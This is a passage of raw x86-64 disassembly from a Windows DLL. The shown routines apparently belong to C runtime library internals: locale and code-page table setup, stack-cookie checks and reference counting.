   1800075b2:	40 88 6b 28          	mov    %bpl,0x28(%rbx)
   1800075b6:	48 89 6b 18          	mov    %rbp,0x18(%rbx)
   1800075ba:	e9 95 00 00 00       	jmp    0x180007654
   1800075bf:	48 8b 42 10          	mov    0x10(%rdx),%rax
   1800075c3:	40 88 28             	mov    %bpl,(%rax)
   1800075c6:	eb be                	jmp    0x180007586
   1800075c8:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   1800075cd:	41 83 c9 ff          	or     $0xffffffff,%r9d
   1800075d1:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   1800075d6:	4c 8b c7             	mov    %rdi,%r8
   1800075d9:	89 6c 24 28          	mov    %ebp,0x28(%rsp)
   1800075dd:	33 d2                	xor    %edx,%edx
   1800075df:	8b ce                	mov    %esi,%ecx
   1800075e1:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1800075e6:	e8 31 0e 00 00       	call   0x18000841c
   1800075eb:	48 63 d0             	movslq %eax,%rdx
   1800075ee:	85 c0                	test   %eax,%eax
   1800075f0:	75 16                	jne    0x180007608
   1800075f2:	ff 15 78 7a 00 00    	call   *0x7a78(%rip)        # 0x18000f070
   1800075f8:	8b c8                	mov    %eax,%ecx
   1800075fa:	e8 85 ea ff ff       	call   0x180006084
   1800075ff:	e8 f0 ea ff ff       	call   0x1800060f4
   180007604:	8b 00                	mov    (%rax),%eax
   180007606:	eb 4c                	jmp    0x180007654
   180007608:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   18000760c:	48 3b d1             	cmp    %rcx,%rdx
   18000760f:	76 0c                	jbe    0x18000761d
   180007611:	40 38 6b 28          	cmp    %bpl,0x28(%rbx)
   180007615:	74 8d                	je     0x1800075a4
   180007617:	40 88 6b 28          	mov    %bpl,0x28(%rbx)
   18000761b:	eb 87                	jmp    0x1800075a4
   18000761d:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180007621:	41 83 c9 ff          	or     $0xffffffff,%r9d
   180007625:	48 89 6c 24 38       	mov    %rbp,0x38(%rsp)
   18000762a:	4c 8b c7             	mov    %rdi,%r8
   18000762d:	48 89 6c 24 30       	mov    %rbp,0x30(%rsp)
   180007632:	33 d2                	xor    %edx,%edx
   180007634:	89 4c 24 28          	mov    %ecx,0x28(%rsp)
   180007638:	8b ce                	mov    %esi,%ecx
   18000763a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   18000763f:	e8 d8 0d 00 00       	call   0x18000841c
   180007644:	48 98                	cltq
   180007646:	48 85 c0             	test   %rax,%rax
   180007649:	74 a7                	je     0x1800075f2
   18000764b:	48 ff c8             	dec    %rax
   18000764e:	48 89 43 20          	mov    %rax,0x20(%rbx)
   180007652:	33 c0                	xor    %eax,%eax
   180007654:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180007659:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   18000765e:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   180007663:	48 83 c4 40          	add    $0x40,%rsp
   180007667:	5f                   	pop    %rdi
   180007668:	c3                   	ret
   180007669:	cc                   	int3
   18000766a:	cc                   	int3
   18000766b:	cc                   	int3
   18000766c:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180007671:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180007676:	55                   	push   %rbp
   180007677:	48 8d ac 24 60 fe ff 	lea    -0x1a0(%rsp),%rbp
   18000767e:	ff 
   18000767f:	48 81 ec a0 02 00 00 	sub    $0x2a0,%rsp
   180007686:	48 8b 05 73 29 01 00 	mov    0x12973(%rip),%rax        # 0x18001a000
   18000768d:	48 33 c4             	xor    %rsp,%rax
   180007690:	48 89 85 90 01 00 00 	mov    %rax,0x190(%rbp)
   180007697:	41 8b f8             	mov    %r8d,%edi
   18000769a:	48 8b da             	mov    %rdx,%rbx
   18000769d:	41 b8 05 01 00 00    	mov    $0x105,%r8d
   1800076a3:	48 8d 55 80          	lea    -0x80(%rbp),%rdx
   1800076a7:	ff 15 63 7a 00 00    	call   *0x7a63(%rip)        # 0x18000f110
   1800076ad:	85 c0                	test   %eax,%eax
   1800076af:	75 14                	jne    0x1800076c5
   1800076b1:	ff 15 b9 79 00 00    	call   *0x79b9(%rip)        # 0x18000f070
   1800076b7:	8b c8                	mov    %eax,%ecx
   1800076b9:	e8 c6 e9 ff ff       	call   0x180006084
   1800076be:	33 c0                	xor    %eax,%eax
   1800076c0:	e9 a4 00 00 00       	jmp    0x180007769
   1800076c5:	48 83 64 24 68 00    	andq   $0x0,0x68(%rsp)
   1800076cb:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1800076d0:	48 8b c7             	mov    %rdi,%rax
   1800076d3:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   1800076d8:	33 d2                	xor    %edx,%edx
   1800076da:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   1800076df:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   1800076e4:	48 89 5c 24 58       	mov    %rbx,0x58(%rsp)
   1800076e9:	c6 44 24 70 00       	movb   $0x0,0x70(%rsp)
   1800076ee:	e8 4d d2 ff ff       	call   0x180004940
   1800076f3:	48 8b 44 24 30       	mov    0x30(%rsp),%rax
   1800076f8:	41 b9 e9 fd 00 00    	mov    $0xfde9,%r9d
   1800076fe:	44 39 48 0c          	cmp    %r9d,0xc(%rax)
   180007702:	75 15                	jne    0x180007719
   180007704:	80 7c 24 40 00       	cmpb   $0x0,0x40(%rsp)
   180007709:	74 47                	je     0x180007752
   18000770b:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180007710:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180007717:	eb 39                	jmp    0x180007752
   180007719:	e8 aa 11 00 00       	call   0x1800088c8
   18000771e:	85 c0                	test   %eax,%eax
   180007720:	75 1a                	jne    0x18000773c
   180007722:	38 44 24 40          	cmp    %al,0x40(%rsp)
   180007726:	74 0c                	je     0x180007734
   180007728:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   18000772d:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   180007734:	41 b9 01 00 00 00    	mov    $0x1,%r9d
   18000773a:	eb 16                	jmp    0x180007752
   18000773c:	80 7c 24 40 00       	cmpb   $0x0,0x40(%rsp)
   180007741:	74 0c                	je     0x18000774f
   180007743:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   180007748:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   18000774f:	45 33 c9             	xor    %r9d,%r9d
   180007752:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   180007757:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   18000775c:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   180007760:	e8 eb fd ff ff       	call   0x180007550
   180007765:	8b 44 24 68          	mov    0x68(%rsp),%eax
   180007769:	48 8b 8d 90 01 00 00 	mov    0x190(%rbp),%rcx
   180007770:	48 33 cc             	xor    %rsp,%rcx
   180007773:	e8 58 9b ff ff       	call   0x1800012d0
   180007778:	4c 8d 9c 24 a0 02 00 	lea    0x2a0(%rsp),%r11
   18000777f:	00 
   180007780:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180007784:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   180007788:	49 8b e3             	mov    %r11,%rsp
   18000778b:	5d                   	pop    %rbp
   18000778c:	c3                   	ret
   18000778d:	cc                   	int3
   18000778e:	cc                   	int3
   18000778f:	cc                   	int3
   180007790:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180007795:	4c 89 4c 24 20       	mov    %r9,0x20(%rsp)
   18000779a:	57                   	push   %rdi
   18000779b:	48 83 ec 40          	sub    $0x40,%rsp
   18000779f:	49 8b f9             	mov    %r9,%rdi
   1800077a2:	49 8b d8             	mov    %r8,%rbx
   1800077a5:	8b 0a                	mov    (%rdx),%ecx
   1800077a7:	e8 6c f1 ff ff       	call   0x180006918
   1800077ac:	90                   	nop
   1800077ad:	48 8b 03             	mov    (%rbx),%rax
   1800077b0:	48 8b 08             	mov    (%rax),%rcx
   1800077b3:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   1800077ba:	48 83 c0 18          	add    $0x18,%rax
   1800077be:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   1800077c3:	48 8b 0d f6 37 01 00 	mov    0x137f6(%rip),%rcx        # 0x18001afc0
   1800077ca:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1800077cf:	48 85 c9             	test   %rcx,%rcx
   1800077d2:	74 6f                	je     0x180007843
   1800077d4:	48 85 c0             	test   %rax,%rax
   1800077d7:	74 5d                	je     0x180007836
   1800077d9:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   1800077df:	45 8b c8             	mov    %r8d,%r9d
   1800077e2:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   1800077e6:	0f 10 00             	movups (%rax),%xmm0
   1800077e9:	0f 11 01             	movups %xmm0,(%rcx)
   1800077ec:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1800077f0:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   1800077f4:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   1800077f8:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   1800077fc:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   180007800:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   180007804:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   180007808:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   18000780c:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   180007810:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   180007814:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   180007818:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   18000781c:	48 03 ca             	add    %rdx,%rcx
   18000781f:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   180007823:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   180007827:	48 03 c2             	add    %rdx,%rax
   18000782a:	49 83 e9 01          	sub    $0x1,%r9
   18000782e:	75 b6                	jne    0x1800077e6
   180007830:	8a 00                	mov    (%rax),%al
   180007832:	88 01                	mov    %al,(%rcx)
   180007834:	eb 27                	jmp    0x18000785d
   180007836:	33 d2                	xor    %edx,%edx
   180007838:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   18000783e:	e8 6d 61 00 00       	call   0x18000d9b0
   180007843:	e8 ac e8 ff ff       	call   0x1800060f4
   180007848:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   18000784e:	e8 f9 e6 ff ff       	call   0x180005f4c
   180007853:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   180007859:	41 8d 50 7e          	lea    0x7e(%r8),%edx
   18000785d:	48 8b 03             	mov    (%rbx),%rax
   180007860:	48 8b 08             	mov    (%rax),%rcx
   180007863:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   18000786a:	48 05 19 01 00 00    	add    $0x119,%rax
   180007870:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180007875:	48 8b 0d 4c 37 01 00 	mov    0x1374c(%rip),%rcx        # 0x18001afc8
   18000787c:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   180007881:	48 85 c9             	test   %rcx,%rcx
   180007884:	74 5e                	je     0x1800078e4
   180007886:	48 85 c0             	test   %rax,%rax
   180007889:	74 4c                	je     0x1800078d7
   18000788b:	0f 10 00             	movups (%rax),%xmm0
   18000788e:	0f 11 01             	movups %xmm0,(%rcx)
   180007891:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   180007895:	0f 11 49 10          	movups %xmm1,0x10(%rcx)
   180007899:	0f 10 40 20          	movups 0x20(%rax),%xmm0
   18000789d:	0f 11 41 20          	movups %xmm0,0x20(%rcx)
   1800078a1:	0f 10 48 30          	movups 0x30(%rax),%xmm1
   1800078a5:	0f 11 49 30          	movups %xmm1,0x30(%rcx)
   1800078a9:	0f 10 40 40          	movups 0x40(%rax),%xmm0
   1800078ad:	0f 11 41 40          	movups %xmm0,0x40(%rcx)
   1800078b1:	0f 10 48 50          	movups 0x50(%rax),%xmm1
   1800078b5:	0f 11 49 50          	movups %xmm1,0x50(%rcx)
   1800078b9:	0f 10 40 60          	movups 0x60(%rax),%xmm0
   1800078bd:	0f 11 41 60          	movups %xmm0,0x60(%rcx)
   1800078c1:	48 03 ca             	add    %rdx,%rcx
   1800078c4:	0f 10 48 70          	movups 0x70(%rax),%xmm1
   1800078c8:	0f 11 49 f0          	movups %xmm1,-0x10(%rcx)
   1800078cc:	48 03 c2             	add    %rdx,%rax
   1800078cf:	49 83 e8 01          	sub    $0x1,%r8
   1800078d3:	75 b6                	jne    0x18000788b
   1800078d5:	eb 1d                	jmp    0x1800078f4
   1800078d7:	33 d2                	xor    %edx,%edx
   1800078d9:	41 b8 00 01 00 00    	mov    $0x100,%r8d
   1800078df:	e8 cc 60 00 00       	call   0x18000d9b0
   1800078e4:	e8 0b e8 ff ff       	call   0x1800060f4
   1800078e9:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   1800078ef:	e8 58 e6 ff ff       	call   0x180005f4c
   1800078f4:	48 8b 43 08          	mov    0x8(%rbx),%rax
   1800078f8:	48 8b 08             	mov    (%rax),%rcx
   1800078fb:	48 8b 11             	mov    (%rcx),%rdx
   1800078fe:	83 c8 ff             	or     $0xffffffff,%eax
   180007901:	f0 0f c1 02          	lock xadd %eax,(%rdx)
   180007905:	83 f8 01             	cmp    $0x1,%eax
   180007908:	75 1b                	jne    0x180007925
   18000790a:	48 8b 43 08          	mov    0x8(%rbx),%rax
   18000790e:	48 8b 08             	mov    (%rax),%rcx
   180007911:	48 8d 05 f8 28 01 00 	lea    0x128f8(%rip),%rax        # 0x18001a210
   180007918:	48 39 01             	cmp    %rax,(%rcx)
   18000791b:	74 08                	je     0x180007925
   18000791d:	48 8b 09             	mov    (%rcx),%rcx
   180007920:	e8 4b f1 ff ff       	call   0x180006a70
   180007925:	48 8b 03             	mov    (%rbx),%rax
   180007928:	48 8b 10             	mov    (%rax),%rdx
   18000792b:	48 8b 43 08          	mov    0x8(%rbx),%rax
   18000792f:	48 8b 08             	mov    (%rax),%rcx
   180007932:	48 8b 82 88 00 00 00 	mov    0x88(%rdx),%rax
   180007939:	48 89 01             	mov    %rax,(%rcx)
   18000793c:	48 8b 03             	mov    (%rbx),%rax
   18000793f:	48 8b 08             	mov    (%rax),%rcx
   180007942:	48 8b 81 88 00 00 00 	mov    0x88(%rcx),%rax
   180007949:	f0 ff 00             	lock incl (%rax)
   18000794c:	8b 0f                	mov    (%rdi),%ecx
   18000794e:	e8 19 f0 ff ff       	call   0x18000696c
   180007953:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   180007958:	48 83 c4 40          	add    $0x40,%rsp
   18000795c:	5f                   	pop    %rdi
   18000795d:	c3                   	ret
   18000795e:	cc                   	int3
   18000795f:	cc                   	int3
   180007960:	40 53                	rex push %rbx
   180007962:	48 83 ec 40          	sub    $0x40,%rsp
   180007966:	8b d9                	mov    %ecx,%ebx
   180007968:	33 d2                	xor    %edx,%edx
   18000796a:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   18000796f:	e8 cc cf ff ff       	call   0x180004940
   180007974:	83 25 5d 36 01 00 00 	andl   $0x0,0x1365d(%rip)        # 0x18001afd8
   18000797b:	83 fb fe             	cmp    $0xfffffffe,%ebx
   18000797e:	75 12                	jne    0x180007992
   180007980:	c7 05 4e 36 01 00 01 	movl   $0x1,0x1364e(%rip)        # 0x18001afd8
   180007987:	00 00 00 
   18000798a:	ff 15 e8 77 00 00    	call   *0x77e8(%rip)        # 0x18000f178
   180007990:	eb 15                	jmp    0x1800079a7
   180007992:	83 fb fd             	cmp    $0xfffffffd,%ebx
   180007995:	75 14                	jne    0x1800079ab
   180007997:	c7 05 37 36 01 00 01 	movl   $0x1,0x13637(%rip)        # 0x18001afd8
   18000799e:	00 00 00 
   1800079a1:	ff 15 c9 77 00 00    	call   *0x77c9(%rip)        # 0x18000f170
   1800079a7:	8b d8                	mov    %eax,%ebx
   1800079a9:	eb 17                	jmp    0x1800079c2
   1800079ab:	83 fb fc             	cmp    $0xfffffffc,%ebx
   1800079ae:	75 12                	jne    0x1800079c2
   1800079b0:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1800079b5:	c7 05 19 36 01 00 01 	movl   $0x1,0x13619(%rip)        # 0x18001afd8
   1800079bc:	00 00 00 
   1800079bf:	8b 58 0c             	mov    0xc(%rax),%ebx
   1800079c2:	80 7c 24 38 00       	cmpb   $0x0,0x38(%rsp)
   1800079c7:	74 0c                	je     0x1800079d5
   1800079c9:	48 8b 4c 24 20       	mov    0x20(%rsp),%rcx
   1800079ce:	83 a1 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rcx)
   1800079d5:	8b c3                	mov    %ebx,%eax
   1800079d7:	48 83 c4 40          	add    $0x40,%rsp
   1800079db:	5b                   	pop    %rbx
   1800079dc:	c3                   	ret
   1800079dd:	cc                   	int3
   1800079de:	cc                   	int3
   1800079df:	cc                   	int3
   1800079e0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800079e5:	57                   	push   %rdi
   1800079e6:	48 83 ec 20          	sub    $0x20,%rsp
   1800079ea:	48 8b d9             	mov    %rcx,%rbx
   1800079ed:	33 d2                	xor    %edx,%edx
   1800079ef:	48 83 c1 18          	add    $0x18,%rcx
   1800079f3:	41 b8 01 01 00 00    	mov    $0x101,%r8d
   1800079f9:	e8 b2 5f 00 00       	call   0x18000d9b0
   1800079fe:	33 d2                	xor    %edx,%edx
   180007a00:	48 8d 7b 0c          	lea    0xc(%rbx),%rdi
   180007a04:	0f b7 c2             	movzwl %dx,%eax
   180007a07:	4c 8d 0d 02 28 01 00 	lea    0x12802(%rip),%r9        # 0x18001a210
   180007a0e:	48 89 53 04          	mov    %rdx,0x4(%rbx)
   180007a12:	4c 8b c3             	mov    %rbx,%r8
   180007a15:	48 89 93 20 02 00 00 	mov    %rdx,0x220(%rbx)
   180007a1c:	8d 4a 06             	lea    0x6(%rdx),%ecx
   180007a1f:	66 f3 ab             	rep stos %ax,(%rdi)
   180007a22:	48 8d 05 ff 27 01 00 	lea    0x127ff(%rip),%rax        # 0x18001a228
   180007a29:	8b fa                	mov    %edx,%edi
   180007a2b:	4c 2b c0             	sub    %rax,%r8
   180007a2e:	4a 8d 0c 0f          	lea    (%rdi,%r9,1),%rcx
   180007a32:	48 ff c7             	inc    %rdi
   180007a35:	8a 41 18             	mov    0x18(%rcx),%al
   180007a38:	41 88 44 08 30       	mov    %al,0x30(%r8,%rcx,1)
   180007a3d:	48 81 ff 01 01 00 00 	cmp    $0x101,%rdi
   180007a44:	7c e8                	jl     0x180007a2e
   180007a46:	48 8d 05 dc 28 01 00 	lea    0x128dc(%rip),%rax        # 0x18001a329
   180007a4d:	48 2b d8             	sub    %rax,%rbx
   180007a50:	4a 8d 0c 0a          	lea    (%rdx,%r9,1),%rcx
   180007a54:	48 ff c2             	inc    %rdx
   180007a57:	8a 81 19 01 00 00    	mov    0x119(%rcx),%al
   180007a5d:	88 84 0b 32 02 00 00 	mov    %al,0x232(%rbx,%rcx,1)
   180007a64:	48 81 fa 00 01 00 00 	cmp    $0x100,%rdx
   180007a6b:	7c e3                	jl     0x180007a50
   180007a6d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180007a72:	48 83 c4 20          	add    $0x20,%rsp
   180007a76:	5f                   	pop    %rdi
   180007a77:	c3                   	ret
   180007a78:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   180007a7d:	48 89 7c 24 18       	mov    %rdi,0x18(%rsp)
   180007a82:	55                   	push   %rbp
   180007a83:	48 8d ac 24 80 f9 ff 	lea    -0x680(%rsp),%rbp
   180007a8a:	ff 
   180007a8b:	48 81 ec 80 07 00 00 	sub    $0x780,%rsp
   180007a92:	48 8b 05 67 25 01 00 	mov    0x12567(%rip),%rax        # 0x18001a000
   180007a99:	48 33 c4             	xor    %rsp,%rax
   180007a9c:	48 89 85 70 06 00 00 	mov    %rax,0x670(%rbp)
   180007aa3:	33 c0                	xor    %eax,%eax
   180007aa5:	48 8b f9             	mov    %rcx,%rdi
   180007aa8:	8b 49 04             	mov    0x4(%rcx),%ecx
   180007aab:	0f 57 c0             	xorps  %xmm0,%xmm0
   180007aae:	89 44 24 60          	mov    %eax,0x60(%rsp)
   180007ab2:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   180007ab7:	81 f9 e9 fd 00 00    	cmp    $0xfde9,%ecx
   180007abd:	0f 84 47 01 00 00    	je     0x180007c0a
   180007ac3:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   180007ac8:	ff 15 b2 76 00 00    	call   *0x76b2(%rip)        # 0x18000f180
   180007ace:	85 c0                	test   %eax,%eax
   180007ad0:	0f 84 34 01 00 00    	je     0x180007c0a
   180007ad6:	33 c0                	xor    %eax,%eax
   180007ad8:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   180007add:	bb 00 01 00 00       	mov    $0x100,%ebx
   180007ae2:	88 01                	mov    %al,(%rcx)
   180007ae4:	ff c0                	inc    %eax
   180007ae6:	48 ff c1             	inc    %rcx
   180007ae9:	3b c3                	cmp    %ebx,%eax
   180007aeb:	72 f5                	jb     0x180007ae2
   180007aed:	8a 44 24 56          	mov    0x56(%rsp),%al
   180007af1:	48 8d 54 24 56       	lea    0x56(%rsp),%rdx
   180007af6:	c6 44 24 70 20       	movb   $0x20,0x70(%rsp)
   180007afb:	eb 20                	jmp    0x180007b1d
   180007afd:	44 0f b6 42 01       	movzbl 0x1(%rdx),%r8d
   180007b02:	0f b6 c8             	movzbl %al,%ecx
   180007b05:	eb 0b                	jmp    0x180007b12
   180007b07:	3b cb                	cmp    %ebx,%ecx
   180007b09:	73 0c                	jae    0x180007b17
   180007b0b:	c6 44 0c 70 20       	movb   $0x20,0x70(%rsp,%rcx,1)
   180007b10:	ff c1                	inc    %ecx
   180007b12:	41 3b c8             	cmp    %r8d,%ecx
   180007b15:	76 f0                	jbe    0x180007b07
   180007b17:	48 83 c2 02          	add    $0x2,%rdx
   180007b1b:	8a 02                	mov    (%rdx),%al
   180007b1d:	84 c0                	test   %al,%al
   180007b1f:	75 dc                	jne    0x180007afd
   180007b21:	8b 47 04             	mov    0x4(%rdi),%eax
   180007b24:	4c 8d 44 24 70       	lea    0x70(%rsp),%r8
   180007b29:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   180007b2e:	44 8b cb             	mov    %ebx,%r9d
   180007b31:	89 44 24 28          	mov    %eax,0x28(%rsp)
   180007b35:	ba 01 00 00 00       	mov    $0x1,%edx
   180007b3a:	48 8d 85 70 02 00 00 	lea    0x270(%rbp),%rax
   180007b41:	33 c9                	xor    %ecx,%ecx
   180007b43:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   180007b48:	e8 97 29 00 00       	call   0x18000a4e4
   180007b4d:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   180007b52:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   180007b57:	8b 47 04             	mov    0x4(%rdi),%eax
   180007b5a:	44 8b c3             	mov    %ebx,%r8d
   180007b5d:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   180007b64:	33 c9                	xor    %ecx,%ecx
   180007b66:	89 44 24 38          	mov    %eax,0x38(%rsp)
   180007b6a:	48 8d 45 70          	lea    0x70(%rbp),%rax
   180007b6e:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180007b72:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180007b77:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180007b7b:	e8 38 38 00 00       	call   0x18000b3b8
   180007b80:	83 64 24 40 00       	andl   $0x0,0x40(%rsp)
   180007b85:	4c 8d 4c 24 70       	lea    0x70(%rsp),%r9
   180007b8a:	8b 47 04             	mov    0x4(%rdi),%eax
   180007b8d:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   180007b93:	48 8b 97 20 02 00 00 	mov    0x220(%rdi),%rdx
   180007b9a:	33 c9                	xor    %ecx,%ecx
   180007b9c:	89 44 24 38          	mov    %eax,0x38(%rsp)
   180007ba0:	48 8d 85 70 01 00 00 	lea    0x170(%rbp),%rax
   180007ba7:	89 5c 24 30          	mov    %ebx,0x30(%rsp)
   180007bab:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180007bb0:	89 5c 24 20          	mov    %ebx,0x20(%rsp)
   180007bb4:	e8 ff 37 00 00       	call   0x18000b3b8
   180007bb9:	4c 8d 45 70          	lea    0x70(%rbp),%r8
   180007bbd:	4c 2b c7             	sub    %rdi,%r8
   180007bc0:	4c 8d 8d 70 01 00 00 	lea    0x170(%rbp),%r9
   180007bc7:	4c 2b cf             	sub    %rdi,%r9
   180007bca:	48 8d 95 70 02 00 00 	lea    0x270(%rbp),%rdx
   180007bd1:	48 8d 47 19          	lea    0x19(%rdi),%rax
   180007bd5:	f6 02 01             	testb  $0x1,(%rdx)
   180007bd8:	74 0a                	je     0x180007be4
   180007bda:	80 08 10             	orb    $0x10,(%rax)
   180007bdd:	41 8a 4c 00 e7       	mov    -0x19(%r8,%rax,1),%cl
   180007be2:	eb 11                	jmp    0x180007bf5
   180007be4:	f6 02 02             	testb  $0x2,(%rdx)
   180007be7:	74 0a                	je     0x180007bf3
   180007be9:	80 08 20             	orb    $0x20,(%rax)
   180007bec:	42 8a 4c 08 e7       	mov    -0x19(%rax,%r9,1),%cl
   180007bf1:	eb 02                	jmp    0x180007bf5
   180007bf3:	32 c9                	xor    %cl,%cl
   180007bf5:	88 88 00 01 00 00    	mov    %cl,0x100(%rax)
   180007bfb:	48 83 c2 02          	add    $0x2,%rdx
   180007bff:	48 ff c0             	inc    %rax
   180007c02:	48 83 eb 01          	sub    $0x1,%rbx
   180007c06:	75 cd                	jne    0x180007bd5
   180007c08:	eb 3f                	jmp    0x180007c49
   180007c0a:	33 d2                	xor    %edx,%edx
   180007c0c:	48 8d 4f 19          	lea    0x19(%rdi),%rcx
   180007c10:	bb 00 01 00 00       	mov    $0x100,%ebx
   180007c15:	44 8d 42 9f          	lea    -0x61(%rdx),%r8d
   180007c19:	41 8d 40 20          	lea    0x20(%r8),%eax
   180007c1d:	83 f8 19             	cmp    $0x19,%eax
   180007c20:	77 08                	ja     0x180007c2a
   180007c22:	80 09 10             	orb    $0x10,(%rcx)
   180007c25:	8d 42 20             	lea    0x20(%rdx),%eax
   180007c28:	eb 10                	jmp    0x180007c3a
   180007c2a:	41 83 f8 19          	cmp    $0x19,%r8d
   180007c2e:	77 08                	ja     0x180007c38
   180007c30:	80 09 20             	orb    $0x20,(%rcx)
   180007c33:	8d 42 e0             	lea    -0x20(%rdx),%eax
   180007c36:	eb 02                	jmp    0x180007c3a
   180007c38:	32 c0                	xor    %al,%al
   180007c3a:	88 81 00 01 00 00    	mov    %al,0x100(%rcx)
   180007c40:	ff c2                	inc    %edx
   180007c42:	48 ff c1             	inc    %rcx
   180007c45:	3b d3                	cmp    %ebx,%edx
   180007c47:	72 cc                	jb     0x180007c15
   180007c49:	48 8b 8d 70 06 00 00 	mov    0x670(%rbp),%rcx
   180007c50:	48 33 cc             	xor    %rsp,%rcx
   180007c53:	e8 78 96 ff ff       	call   0x1800012d0
   180007c58:	4c 8d 9c 24 80 07 00 	lea    0x780(%rsp),%r11
   180007c5f:	00 
   180007c60:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   180007c64:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   180007c68:	49 8b e3             	mov    %r11,%rsp
   180007c6b:	5d                   	pop    %rbp
   180007c6c:	c3                   	ret
   180007c6d:	cc                   	int3
   180007c6e:	cc                   	int3
   180007c6f:	cc                   	int3
   180007c70:	48 8b c4             	mov    %rsp,%rax
   180007c73:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180007c77:	48 89 70 10          	mov    %rsi,0x10(%rax)
   180007c7b:	4c 89 48 20          	mov    %r9,0x20(%rax)
   180007c7f:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180007c83:	55                   	push   %rbp
   180007c84:	57                   	push   %rdi
   180007c85:	41 56                	push   %r14
   180007c87:	48 8d a8 78 fe ff ff 	lea    -0x188(%rax),%rbp
   180007c8e:	48 81 ec 70 02 00 00 	sub    $0x270,%rsp
   180007c95:	44 8a f2             	mov    %dl,%r14b
   180007c98:	8b d9                	mov    %ecx,%ebx
   180007c9a:	49 8b d1             	mov    %r9,%rdx
   180007c9d:	49 8b c8             	mov    %r8,%rcx
   180007ca0:	e8 3b 02 00 00       	call   0x180007ee0
   180007ca5:	8b cb                	mov    %ebx,%ecx
   180007ca7:	e8 b4 fc ff ff       	call   0x180007960
   180007cac:	48 8b 8d a0 01 00 00 	mov    0x1a0(%rbp),%rcx
   180007cb3:	8b f8                	mov    %eax,%edi
   180007cb5:	4c 8b 81 88 00 00 00 	mov    0x88(%rcx),%r8
   180007cbc:	41 3b 40 04          	cmp    0x4(%r8),%eax
   180007cc0:	75 07                	jne    0x180007cc9
   180007cc2:	33 c0                	xor    %eax,%eax
   180007cc4:	e9 fe 01 00 00       	jmp    0x180007ec7
   180007cc9:	b9 28 02 00 00       	mov    $0x228,%ecx
   180007cce:	e8 1d 1b 00 00       	call   0x1800097f0
   180007cd3:	48 8b d8             	mov    %rax,%rbx
   180007cd6:	48 85 c0             	test   %rax,%rax
   180007cd9:	75 0f                	jne    0x180007cea
